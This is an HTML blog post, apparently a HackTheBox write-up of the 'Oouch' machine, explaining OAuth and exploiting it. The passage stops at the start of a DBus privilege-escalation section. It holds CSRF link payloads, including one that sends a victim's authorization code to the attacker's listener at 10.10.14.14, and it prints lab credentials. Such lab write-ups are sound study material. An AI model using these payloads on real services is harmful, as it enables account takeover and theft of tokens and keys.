@@ -1,0 +1,996 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  
+    <title>HTB - Oouch :: squ4r00t</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Writeup for the &#39;Hard&#39; rated machine: Oouch" />
+<meta name="keywords" content=", " />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="//localhost:1313/posts/htb-oouch/" />
+
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="//localhost:1313/styles.css">
+
+
+
+
+
+
+
+  <link rel="shortcut icon" href="//localhost:1313/img/theme-colors/orange.png">
+  <link rel="apple-touch-icon" href="//localhost:1313/img/theme-colors/orange.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="HTB - Oouch">
+<meta property="og:description" content="Writeup for the &#39;Hard&#39; rated machine: Oouch" />
+<meta property="og:url" content="//localhost:1313/posts/htb-oouch/" />
+<meta property="og:site_name" content="squ4r00t" />
+
+  
+  
+  <meta property="og:image" content="//localhost:1313/img/htb/oouch/tn.png">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2025-05-10 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+</head>
+<body class="">
+
+
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    &lt; squ4r00t &gt;
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/whoami">$ whoami</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+      
+        
+          <li><a href="/whoami" >$ whoami</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="//localhost:1313/posts/htb-oouch/">HTB - Oouch</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2025-05-10</time><span class="post-author">squ4r00t</span>
+    
+<span class="post-reading-time">13 minute(s) read (2673 words)</span></div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="//localhost:1313/tags/ctf/">ctf</a>&nbsp;
+      
+      #<a href="//localhost:1313/tags/htb/">htb</a>&nbsp;
+      
+      #<a href="//localhost:1313/tags/oauth/">oauth</a>&nbsp;
+      
+      #<a href="//localhost:1313/tags/dbus/">dbus</a>&nbsp;
+      
+    </span>
+  
+  
+    
+    <img src="//localhost:1313/img/htb/oouch/tn.png"
+      class="post-cover"
+      alt=" "
+      title="Cover Image" />
+  
+
+
+
+  
+
+  <div class="post-content"><div>
+        <blockquote>
+<p>Oouch is a hard difficulty Linux machine featuring web applications that use the OAuth authorization framework. Absence of a CSRF Token is leveraged to link an administrative account to our account, providing access to sensitive information. This information is used to register a new client application and steal the authorization code. This code is used to gain an access token, which provides unrestricted access to user resources. A misconfigured DBus server is then exploited through uWSGI in order to execute code in the context of root.</p></blockquote>
+<h2 id="port-scan-results">Port Scan Results<a href="#port-scan-results" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<hr>
+<p>From the results of the nmap scan, we see that we have 4 ports open: 21, 22, 5000 and 8000</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">PORT     STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">21/tcp   open  ftp     vsftpd 2.0.8 or later
+</span></span><span class="line"><span class="cl">| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+</span></span><span class="line"><span class="cl">|_-rw-r--r--    1 ftp      ftp            49 Feb 11  2020 project.txt
+</span></span><span class="line"><span class="cl">22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+</span></span><span class="line"><span class="cl">5000/tcp open  http    nginx 1.14.2
+</span></span><span class="line"><span class="cl">| http-title: Welcome to Oouch
+</span></span><span class="line"><span class="cl">|_Requested resource was http://10.10.10.177:5000/login?next=%2F
+</span></span><span class="line"><span class="cl">|_http-server-header: nginx/1.14.2
+</span></span><span class="line"><span class="cl">8000/tcp open  rtsp
+</span></span></code></pre></div><h2 id="ftp">FTP<a href="#ftp" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<hr>
+<p>From the nmap results, we can see that we have anonymous login allowed and we can access <code>project.txt</code>:</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="359726418" type="checkbox"  />
+    <label for="359726418">
+      <span class="collapsable-code__language">bash</span>
+      <span class="collapsable-code__title">Retrieving the project.txt file</span>
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-bash" ><code>
+ftp 10.10.10.177
+
+Connected to 10.10.10.177.
+220 qtc&#39;s development server
+Name (10.10.10.177:squ4r00t): anonymous
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; ls
+229 Entering Extended Passive Mode (|||48291|)
+150 Here comes the directory listing.
+-rw-r--r--    1 ftp      ftp            49 Feb 11  2020 project.txt
+226 Directory send OK.
+ftp&gt; get project.txt
+local: project.txt remote: project.txt
+229 Entering Extended Passive Mode (|||40240|)
+150 Opening BINARY mode data connection for project.txt (49 bytes).
+100% |***************************************************************************************|    49       65.01 KiB/s    00:00 ETA
+226 Transfer complete.
+49 bytes received in 00:00 (0.94 KiB/s)
+ftp&gt; exit
+221 Goodbye.
+</code></pre>
+  </div>
+
+
+<p>And the file contains the following:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">Flask -&gt; Consumer
+</span></span><span class="line"><span class="cl">Django -&gt; Authorization Server
+</span></span></code></pre></div><p>From this, we can assume that there is an Oauth system in place and that the Django server is the Authorization Server and the Flask server is the consumer / client app.</p>
+<h2 id="website-at-5000">Website at :5000<a href="#website-at-5000" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<hr>
+<p>Navigating to <code>http://10.10.10.177</code>, we are redirected to <code>/login?next=%2f</code>:</p>
+
+  <figure class="center" >
+    <img src="/img/htb/oouch/web5000_homepage.png"   />
+    
+      <figcaption class="center" >Login Page</figcaption>
+    
+  </figure>
+
+
+<p>We can also register an account at <code>/register</code>:</p>
+
+  <figure class="center" >
+    <img src="/img/htb/oouch/web5000_register.png"   />
+    
+      <figcaption class="center" >Register Page</figcaption>
+    
+  </figure>
+
+
+<p>Let&rsquo;s try to register an account</p>
+
+  <figure class="center" >
+    <img src="/img/htb/oouch/web5000_register_request.png"   />
+    
+      <figcaption class="center" >Registering an Account</figcaption>
+    
+  </figure>
+
+
+<p>After logging in with the newly created account, we get this page:</p>
+
+  <figure class="center" >
+    <img src="/img/htb/oouch/web5000_after_login.png"   />
+    
+      <figcaption class="center" >After login</figcaption>
+    
+  </figure>
+
+
+<p>We have several other pages on the side bar:</p>
+<ul>
+<li>
+<p><strong>Menu</strong>: which is just the home page
+
+  <figure class="center" >
+    <img src="/img/htb/oouch/web5000_menu.png"   />
+    
+      <figcaption class="center" >Menu</figcaption>
+    
+  </figure>
+
+</p>
+</li>
+<li>
+<p><strong>Profile</strong>: This page shows user&rsquo;s information including connected accounts, which might be handy later
+
+  <figure class="center" >
+    <img src="/img/htb/oouch/web5000_profile.png"   />
+    
+      <figcaption class="center" >Profile Page</figcaption>
+    
+  </figure>
+
+</p>
+</li>
+<li>
+<p><strong>Password Change</strong>: Allows us to change password. Uses a CSRF token that is verified
+
+  <figure class="center" >
+    <img src="/img/htb/oouch/web5000_password_change.png"   />
+    
+      <figcaption class="center" >Password Change Page</figcaption>
+    
+  </figure>
+
+</p>
+</li>
+<li>
+<p><strong>Documents</strong>: This page is only accessible to admin users
+
+  <figure class="center" >
+    <img src="/img/htb/oouch/web5000_documents.png"   />
+    
+      <figcaption class="center" >Documents</figcaption>
+    
+  </figure>
+
+</p>
+</li>
+<li>
+<p><strong>About</strong>: From this page we learn that this web app is the authorization server
+
+  <figure class="center" >
+    <img src="/img/htb/oouch/web5000_about.png"   />
+    
+      <figcaption class="center" >About</figcaption>
+    
+  </figure>
+
+</p>
+</li>
+<li>
+<p><strong>Contact</strong>: We are presented a form to report bugs to the administrator
+
+  <figure class="center" >
+    <img src="/img/htb/oouch/web5000_contact.png"   />
+    
+      <figcaption class="center" >Contact</figcaption>
+    
+  </figure>
+
+</p>
+<p>However, XSS attempts are detected and stopped:</p>
+
+      <figure class="center" >
+        <img src="/img/htb/oouch/web5000_hacking_detected.png"   />
+        
+          <figcaption class="center" >Hacking Attempt Detected!</figcaption>
+        
+      </figure>
+    
+
+</li>
+</ul>
+<p>Let&rsquo;s try to see if there are other pages that we can&rsquo;t access from the web page UI:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ffuf -u <span class="s1">&#39;http://10.10.10.177:5000/FUZZ&#39;</span> -w /usr/share/wordlists/dirb/common.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        /<span class="s1">&#39;___\  /&#39;</span>___<span class="se">\ </span>          /<span class="err">&#39;</span>___<span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>       /<span class="se">\ \_</span>_/ /<span class="se">\ \_</span>_/  __  __  /<span class="se">\ \_</span>_/
+</span></span><span class="line"><span class="cl">       <span class="se">\ \ </span>,__<span class="se">\\</span> <span class="se">\ </span>,__<span class="se">\/\ \/\ \ \ \ </span>,__<span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>        <span class="se">\ \ \_</span>/ <span class="se">\ \ \_</span>/<span class="se">\ \ \_\ \ \ \ \_</span>/
+</span></span><span class="line"><span class="cl">         <span class="se">\ \_\ </span>  <span class="se">\ \_\ </span> <span class="se">\ \_</span>___/  <span class="se">\ \_\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>          <span class="se">\/</span>_/    <span class="se">\/</span>_/   <span class="se">\/</span>___/    <span class="se">\/</span>_/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">       v2.1.0-dev
+</span></span><span class="line"><span class="cl">________________________________________________
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> :: Method           : GET
+</span></span><span class="line"><span class="cl"> :: URL              : http://10.10.10.177:5000/FUZZ
+</span></span><span class="line"><span class="cl"> :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
+</span></span><span class="line"><span class="cl"> :: Follow redirects : <span class="nb">false</span>
+</span></span><span class="line"><span class="cl"> :: Calibration      : <span class="nb">false</span>
+</span></span><span class="line"><span class="cl"> :: Timeout          : <span class="m">10</span>
+</span></span><span class="line"><span class="cl"> :: Threads          : <span class="m">40</span>
+</span></span><span class="line"><span class="cl"> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+</span></span><span class="line"><span class="cl">________________________________________________
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                        <span class="o">[</span>Status: 302, Size: 237, Words: 22, Lines: 4, Duration: 91ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">about                   <span class="o">[</span>Status: 302, Size: 247, Words: 22, Lines: 4, Duration: 63ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">contact                 <span class="o">[</span>Status: 302, Size: 251, Words: 22, Lines: 4, Duration: 67ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">documents               <span class="o">[</span>Status: 302, Size: 255, Words: 22, Lines: 4, Duration: 51ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">home                    <span class="o">[</span>Status: 302, Size: 245, Words: 22, Lines: 4, Duration: 86ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">login                   <span class="o">[</span>Status: 200, Size: 1828, Words: 414, Lines: 55, Duration: 93ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="nb">logout</span>                  <span class="o">[</span>Status: 302, Size: 219, Words: 22, Lines: 4, Duration: 72ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">oauth                   <span class="o">[</span>Status: 302, Size: 247, Words: 22, Lines: 4, Duration: 48ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">profile                 <span class="o">[</span>Status: 302, Size: 251, Words: 22, Lines: 4, Duration: 79ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">register                <span class="o">[</span>Status: 200, Size: 2109, Words: 517, Lines: 64, Duration: 132ms<span class="o">]</span>
+</span></span></code></pre></div><p>We see a new endpoint, <code>/oauth</code>:</p>
+
+  <figure class="center" >
+    <img src="/img/htb/oouch/web5000_oauth.png"   />
+    
+      <figcaption class="center" >OAuth Endpoint</figcaption>
+    
+  </figure>
+
+
+<p>After adding <code>consumer.oouch.htb</code> and <code>oouch.htb</code> to the hosts file, and trying to go to <code>http://consumer.oouch.htb:5000/oauth/connect</code>, we are redirected to the following URL: <code>http://authorization.oouch.htb:8000/oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&amp;response_type=code&amp;redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token&amp;scope=read</code> which is the site on port 8000.</p>
+<p>Let&rsquo;s also add <code>authorization.oouch.htb</code> to our hosts file.</p>
+<h2 id="website-at-8000">Website at :8000<a href="#website-at-8000" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<hr>
+<p>Navigating once again to the previous URL, we land on this page:</p>
+<p>
+  <figure class="center" >
+    <img src="/img/htb/oouch/web8000_login.png"   />
+    
+      <figcaption class="center" >OAuth Server Login Page :8000/login</figcaption>
+    
+  </figure>
+
+
+</p>
+<p>Before moving forward, let&rsquo;s have an overview on how Oauth works.</p>
+<h3 id="how-oauth-works-">How Oauth works ?<a href="#how-oauth-works-" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<hr>
+<p>Oauth is an authorization framework that allows one website (consumer/client app) to access a user&rsquo;s data from another website (oauth server/provider) without knowing the user&rsquo;s password.</p>
+<blockquote>
+<p>For more information -&gt; <a href="https://portswigger.net/web-security/oauth">https://portswigger.net/web-security/oauth</a></p></blockquote>
+<p>Let&rsquo;s take a look at the following diagram from <a href="https://portswigger.net/web-security/oauth/grant-types">PortSwigger</a> showing the different steps involved:</p>
+
+  <figure class="center" >
+    <img src="/img/htb/oouch/oauth_workflow.jpg"   />
+    
+      <figcaption class="center" >OAuth Worflow for Authorization Code Grant Type</figcaption>
+    
+  </figure>
+
+
+<ol>
+<li>
+<p><strong>Authorization request</strong>: This is the first request that initiates the Oauth process. It is sent by the consumer to the Oauth server through the user&rsquo;s browser. In our case, it corresponds to this request:</p>
+
+      <figure class="center" >
+        <img src="/img/htb/oouch/auth_req.png"   />
+        
+          <figcaption class="center" >Authorization Request</figcaption>
+        
+      </figure>
+    
+
+<p>In this request, the consumer also sends his <code>client_id</code> in order to authenticate to the Oauth server, the <code>response_type</code> parameter indicating the <a href="https://portswigger.net/web-security/oauth/grant-types">grant type</a>, <code>redirect_uri</code> which is the page that the user will be redirected to after consenting, finally <code>scope</code> indicating operations to be done with the accessed data (&lsquo;read&rsquo; in this case).</p>
+</li>
+<li>
+<p><strong>User Login &amp; Consent</strong>: After the first request is sent, the user is sent to the OAuth provider page so that they can login and consent to authorize the client application to access their data.</p>
+</li>
+<li>
+<p><strong>Authorization Code Grant</strong>: Once the user consents, they are redirected to the URL that was provided through the <code>redirect_uri</code> parameter along with the authorization code. This authorization code is linked to the user account on the OAuth server/provider website.</p>
+</li>
+<li>
+<p><strong>Access Token Request</strong>: Using the previous authorization code, the client application will contact directly the Oauth server (without going through the user&rsquo;s browser) asking for a token.</p>
+</li>
+<li>
+<p><strong>Access Token Grant</strong>: After doing some verifications, the OAuth server will send the token to the client application, allowing it to access user data.</p>
+</li>
+<li>
+<p><strong>API Call</strong>: The client application makes an API call to retrieve user data</p>
+</li>
+<li>
+<p><strong>User Data</strong>: The OAuth server checks the token and sends the data.</p>
+</li>
+</ol>
+<h3 id="understanding-oouchs-oauth-flow">Understanding Oouch&rsquo;s OAuth Flow<a href="#understanding-oouchs-oauth-flow" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<hr>
+<p>Going back a little bit, we notice that when we tried to connect another account to our existing account on <code>consumer.oouch.htb:5000</code> through the <code>/oauth/connect</code> endpoint, it triggered the OAuth flow by redirecting us to the OAuth server on <code>authorization.oouch.htb:8000/oauth/authorize</code> along with the following parameters:</p>
+<ul>
+<li><code>client_id</code></li>
+<li><code>response_type</code></li>
+<li><code>redirect_uri</code></li>
+<li><code>scope</code></li>
+</ul>
+<p>This represent the first step, or the <strong>&ldquo;Authorization request&rdquo;</strong>, referring to the previous diagram.</p>
+<p>After that we&rsquo;re then redirected once again to the login page of the OAuth server at <code>authorization.oouch.htb:8000/login/</code> where the application expects us to login and consent (this is step 2).</p>
+<p>However, right now we don&rsquo;t have an account on the OAuth server website. So we&rsquo;ll need to find a way to create one there.</p>
+<p>If we go to <code>authorization.oouch.htb:8000/</code>, we see the following:</p>
+
+  <figure class="center" >
+    <img src="/img/htb/oouch/web8000_homepage.png"   />
+    
+      <figcaption class="center" >authorization.oouch.htb:8000/</figcaption>
+    
+  </figure>
+
+
+<p>We see in the notice that we can provide SSH credentials. This might be interesting, but for now let&rsquo;s just create an account by going to <code>/signup</code></p>
+
+  <figure class="center" >
+    <img src="/img/htb/oouch/web8000_register.png"   />
+    
+      <figcaption class="center" >authorization.oouch.htb:8000/signup</figcaption>
+    
+  </figure>
+
+
+<p>After creating the account and logging in, we are sent to <code>/home</code>:</p>
+
+  <figure class="center" >
+    <img src="/img/htb/oouch/web8000_after_login.png"   />
+    
+      <figcaption class="center" >authorization.oouch.htb:8000/home</figcaption>
+    
+  </figure>
+
+
+<p>In this page we&rsquo;re shown the relevant endpoints that are involved in the OAuth process:</p>
+<ul>
+<li><code>/oauth/authorize</code>: which is the endpoint where the Authorization request is sent (step 1).</li>
+<li><code>/oauth/token</code>: which we don&rsquo;t know the use of yet.</li>
+</ul>
+<p>Now that we have an account on the OAuth server (Oouch), let&rsquo;s connect this account to the account that we have on <code>consumer.oouch.htb:5000</code> by once again going to <code>consumer.oouch.htb:5000/oauth/connect</code>.</p>
+<p>This time, since we&rsquo;re already logged in on the OAuth server, we are directly asked to consent:</p>
+
+  <figure class="center" >
+    <img src="/img/htb/oouch/web8000_consent_burp.png"   />
+    
+      <figcaption class="center" >Authorization Prompt in Burp</figcaption>
+    
+  </figure>
+
+
+<p>Once we click on Authorize, we&rsquo;re redirected to our user profile at <code>consumer.oouch.htb:5000/profile</code>, and we see that our account on Oouch (the OAuth server) is now linked:</p>
+
+  <figure class="center" >
+    <img src="/img/htb/oouch/web5000_profile_connected.png"   />
+    
+      <figcaption class="center" >Oouch account linked!</figcaption>
+    
+  </figure>
+
+
+<p>When we clicked on Authorize, the following POST request was sent:</p>
+
+  <figure class="center" >
+    <img src="/img/htb/oouch/web8000_consent_post_request.png"   />
+    
+      <figcaption class="center" >Consent POST Request</figcaption>
+    
+  </figure>
+
+
+<p>which lead to a redirect to: <code>consumer.oouch.htb:5000/oauth/connect/token?code=&lt;AUTH_CODE&gt;</code>.</p>
+<p>When we hit that endpoint, it will check if the authorization code (<code>code</code> parameter) is valid. If so, the account linked to the authorization code (in this case the account we created on the OAuth server: <code>squ4r00t_oouch</code>) will be linked to the consumer web application.</p>
+<p>We also notice something interesting: the <code>state</code> parameter is empty. The absence of this parameter potentially means that an attacker can initiate an OAuth flow themselves before tricking a user&rsquo;s browser into completing it, similar to a traditional CSRF attack.</p>
+<h3 id="oauth-exploitation-part-1">OAuth Exploitation: Part 1<a href="#oauth-exploitation-part-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<hr>
+<p>We&rsquo;ll initiate the OAuth process normally until we arrive at the moment we&rsquo;re redirected to <code>consumer.oouch.htb:5000/oauth/connect/token?code=&lt;AUTH_CODE&gt;</code> at which point (<strong><em>without following the redirect!</em></strong>) we&rsquo;ll try to make the administrator access that link. This will tie our account (the one on the OAuth server: <code>squ4r00t_oouch</code>) to the administrator&rsquo;s account (the one on the consumer: port 5000).</p>
+<p>We&rsquo;ll send the following payload in the contact form:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;http://consumer.oouch.htb:5000/oauth/connect/token?code=a1b2.....xyz&#34;</span><span class="p">&gt;</span>click here!<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+</span></span></code></pre></div><blockquote>
+<p>Make sure to replace the authorization code with a valid one tied to your account on the Authorization server.</p></blockquote>
+
+  <figure class="center" >
+    <img src="/img/htb/oouch/web5000_link_sent.png"   />
+    
+      <figcaption class="center" >CSRF link sent to admin</figcaption>
+    
+  </figure>
+
+
+<p>After a few second, we see that our Oouch account not linked anymore:</p>
+
+  <figure class="center" >
+    <img src="/img/htb/oouch/web5000_no_accounts_linked.png"   />
+    
+      <figcaption class="center" >No Accounts Connected.</figcaption>
+    
+  </figure>
+
+
+<p>Let&rsquo;s try to logout, and login with our Oouch account at <code>consumer.oouch.htb:5000/oauth/login</code>:</p>
+
+  <figure class="center" >
+    <img src="/img/htb/oouch/web5000_qtc_linked.png"   />
+    
+      <figcaption class="center" >Logged in as qtc.</figcaption>
+    
+  </figure>
+
+
+<p>We can see that our Oouch account was linked to qtc&rsquo;s account.</p>
+<p>Now if we go to <code>/documents</code>, we see something different:</p>
+
+  <figure class="center" >
+    <img src="/img/htb/oouch/web5000_documents_qtc.png"   />
+    
+      <figcaption class="center" >qtc's documents.</figcaption>
+    
+  </figure>
+
+
+<p>From this we learn:</p>
+<ul>
+<li>We have developer credentials we can use for &ldquo;application registration&rdquo; <code>develop:supermegasecureklarabubu123!</code></li>
+<li><code>/api/get_user</code> to get user data (returns a 403)</li>
+<li><code>/oauth/authorize</code> supports GET method</li>
+<li>There is an ssh key to be found somewhere</li>
+</ul>
+<h3 id="oauth-exploitation-part-2">OAuth Exploitation: Part 2<a href="#oauth-exploitation-part-2" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<hr>
+<p>Let&rsquo;s try to find others endpoints under <code>/oauth/</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ffuf -u <span class="s1">&#39;http://authorization.oouch.htb:8000/oauth/FUZZ&#39;</span> -w /usr/share/wordlists/dirb/common.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        /<span class="s1">&#39;___\  /&#39;</span>___<span class="se">\ </span>          /<span class="err">&#39;</span>___<span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>       /<span class="se">\ \_</span>_/ /<span class="se">\ \_</span>_/  __  __  /<span class="se">\ \_</span>_/
+</span></span><span class="line"><span class="cl">       <span class="se">\ \ </span>,__<span class="se">\\</span> <span class="se">\ </span>,__<span class="se">\/\ \/\ \ \ \ </span>,__<span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>        <span class="se">\ \ \_</span>/ <span class="se">\ \ \_</span>/<span class="se">\ \ \_\ \ \ \ \_</span>/
+</span></span><span class="line"><span class="cl">         <span class="se">\ \_\ </span>  <span class="se">\ \_\ </span> <span class="se">\ \_</span>___/  <span class="se">\ \_\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>          <span class="se">\/</span>_/    <span class="se">\/</span>_/   <span class="se">\/</span>___/    <span class="se">\/</span>_/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">       v2.1.0-dev
+</span></span><span class="line"><span class="cl">________________________________________________
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> :: Method           : GET
+</span></span><span class="line"><span class="cl"> :: URL              : http://authorization.oouch.htb:8000/oauth/FUZZ
+</span></span><span class="line"><span class="cl"> :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
+</span></span><span class="line"><span class="cl"> :: Follow redirects : <span class="nb">false</span>
+</span></span><span class="line"><span class="cl"> :: Calibration      : <span class="nb">false</span>
+</span></span><span class="line"><span class="cl"> :: Timeout          : <span class="m">10</span>
+</span></span><span class="line"><span class="cl"> :: Threads          : <span class="m">40</span>
+</span></span><span class="line"><span class="cl"> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+</span></span><span class="line"><span class="cl">________________________________________________
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">applications            <span class="o">[</span>Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 50ms<span class="o">]</span>
+</span></span></code></pre></div><p>Going to <code>/oauth/applications</code> presents us with a login prompt and trying the credentials we found in qtc&rsquo;s documents doesn&rsquo;t work.</p>
+
+  <figure class="center" >
+    <img src="/img/htb/oouch/web8000_applications.png"   />
+    
+      <figcaption class="center" >HTTP Basic Auth</figcaption>
+    
+  </figure>
+
+
+<p>After some more enumeration, we find the <code>/oauth/applications/register</code> endpoint where the credentials worked.</p>
+<p>We are then directed to the application registration page:</p>
+
+  <figure class="center" >
+    <img src="/img/htb/oouch/web8000_applications_register.png"   />
+    
+      <figcaption class="center" >Application Registration Page</figcaption>
+    
+  </figure>
+
+
+<p>Client id and client secret are provided by the application. Clicking on save will register our new application to the OAuth server:</p>
+
+  <figure class="center" >
+    <img src="/img/htb/oouch/web8000_applications_created.png"   />
+    
+      <figcaption class="center" >Application Created!</figcaption>
+    
+  </figure>
+
+
+<p>Now that our application is created, we use it with the CSRF in the contact form in order to trick the user to authorize our application. Once they do, we&rsquo;ll receive the authorization code (tied to their account) which we can then use to request an access token that will allow us to authenticate as them.</p>
+<blockquote>
+<p>Don&rsquo;t forget to setup a listener on the return URL to catch the authorization token</p></blockquote>
+<p>We can use the following payload:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;http://authorization.oouch.htb:8000/oauth/authorize/?client_id=dQ8riRsCow9njRJOLr35uzUg0imhn9SAq8o3bawX&amp;response_type=code&amp;redirect_uri=http://10.10.14.14/pwned&amp;scope=read&amp;allow=Authorize&#34;</span><span class="p">&gt;</span>click!<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+</span></span></code></pre></div><blockquote>
+<p>Notice <code>&amp;allow=Authorize</code> (originally in the request POST body) was added to the URL parameters since this endpoint is said to allow the GET method.</p></blockquote>
+<p>After a few seconds, we get the authorization code on our netcat listener:</p>
+
+  <figure class="center" >
+    <img src="/img/htb/oouch/nc_listener_auth_code.png"   />
+    
+      <figcaption class="center" >Authorization Code!</figcaption>
+    
+  </figure>
+
+
+<p>Now we can request a token on the <code>/oauth/token</code> endpoint we found earlier:</p>
+
+  <figure class="center" >
+    <img src="/img/htb/oouch/web8000_get_token.png"   />
+    
+      <figcaption class="center" >Got the Bearer token!</figcaption>
+    
+  </figure>
+
+
+<p>Using this token, we can for example, access <code>/api/get_user</code>:</p>
+
+  <figure class="center" >
+    <img src="/img/htb/oouch/web8000_api_getuser.png"   />
+    
+      <figcaption class="center" >Information about qtc</figcaption>
+    
+  </figure>
+
+
+<p>After more enumeration for other api endpoints, we find <code>/api/get_sshkey</code>:</p>
+
+  <figure class="center" >
+    <img src="/img/htb/oouch/web8000_api_getsshkey.png"   />
+    
+      <figcaption class="center" >qtc's ssh key</figcaption>
+    
+  </figure>
+
+
+<p>Using the ssh key, we can login as qtc and retrieve the user flag:</p>
+
+  <figure class="center" >
+    <img src="/img/htb/oouch/user_flag.png"   />
+    
+      <figcaption class="center" >User flag obtained !</figcaption>
+    
+  </figure>
+
+
+<h2 id="privesc">Privesc<a href="#privesc" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<hr>
+<h3 id="qtc---www-data">qtc -&gt; www-data<a href="#qtc---www-data" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<hr>
+<p>In the home directory we find a note:</p>
+
+  <figure class="center" >
+    <img src="/img/htb/oouch/qtc_note.png"   />
+    
+      <figcaption class="center" >Note in home directory</figcaption>
+    
+  </figure>
+
+
+<p>This talks about an Intrusion Prevention System being implemented using DBus an iptables. This might be what was blocking us earlier when we tried XSS in the contact form.</p>
+<p>Since the note mentionned DBUS, let&rsquo;s look at the configuration files of the different registered services. Going under <code>/etc/dbus-1/system.d/</code>, we find the following:</p>
+
+  <figure class="center" >
+    <img src="/img/htb/oouch/dbus_htb_oouch.png"   />
+    
+      <figcaption class="center" >htb.oouch.Block's config file</figcaption>
+    
+  </figure>
+
+
+<p>This is the configuration file of the service named: <code>htb.oouch.Block</code>. Let&rsquo;s look at its content:</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="451683927" type="checkbox"  />
+    <label for="451683927">
+      <span class="collapsable-code__language">xml</span>
+      <span class="collapsable-code__title">Configuration file for htb.oouch.Block</span>
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-xml" ><code>
